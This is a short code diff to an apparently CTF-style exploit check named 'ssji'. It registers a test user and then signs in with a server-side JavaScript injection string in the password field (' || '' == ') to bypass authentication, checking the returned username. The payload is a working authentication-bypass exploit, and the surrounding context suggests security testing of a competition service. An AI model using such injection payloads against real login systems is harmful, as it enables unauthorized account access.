@@ -66,10 +66,11 @@ def buy(host, session_id):
 @srv.exploit("ssji")
 def exploit(host):
     s = requests.Session()
-    r = s.post(f"{schema}://{host}:{port}", data={"login": "admin", "passwd": "' || '' == '", "action": "signin"})
+    s.post(f"{schema}://{host}:{port}/",data={"login": "client13337", "passwd": "3u4t8h834t", "action": "signup", "card": ""})
+    r = s.post(f"{schema}://{host}:{port}", data={"login": "client13337", "passwd": "' || '' == '", "action": "signin"})
     soup = BeautifulSoup(r.text, "html.parser")
     req = soup.find("h3", class_="username")
-    if req.text == 'admin':
+    if req.text == 'client13337':
         return 1
 
 
